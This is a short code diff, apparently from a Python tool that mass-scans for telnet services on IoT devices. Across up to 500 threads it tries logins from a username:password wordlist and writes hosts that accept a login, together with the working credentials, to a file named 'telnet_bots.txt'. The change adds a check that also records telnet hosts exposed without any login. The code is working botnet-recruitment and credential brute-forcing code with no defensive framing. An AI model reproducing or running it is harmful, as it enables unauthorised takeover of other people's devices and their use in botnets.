@@ -121,17 +121,23 @@ class iott(threading.Thread):
    except Exception as ex: 
     pass
    if i==True:
-    for x in wordlist:
-     try:
-      username=x.split(':')[0]
-      password=x.split(':')[1]
-      q= telnet(ip,username=username,password=password)
-      if q==True:
-       ip+=':'+username+':'+password
-       print (ip)
-       write_file(ip,filen)
-     except Exception as e: 
-      pass
+    expos=False
+    if exposed_telnet(ip)==True:
+        ip+='::'
+        print (ip)
+        write_file(ip,filen)
+    else:
+     for x in wordlist:
+      try:
+       username=x.split(':')[0]
+       password=x.split(':')[1]
+       q= telnet(ip,username=username,password=password)
+       if q==True:
+        ip+=':'+username+':'+password
+        print (ip)
+        write_file(ip,filen)
+      except Exception as e: 
+       pass
 def mass_telnet(threads=500,word_list=wordlist,filename='telnet_bots.txt',ip_range=None):
  global stop
  stop=False
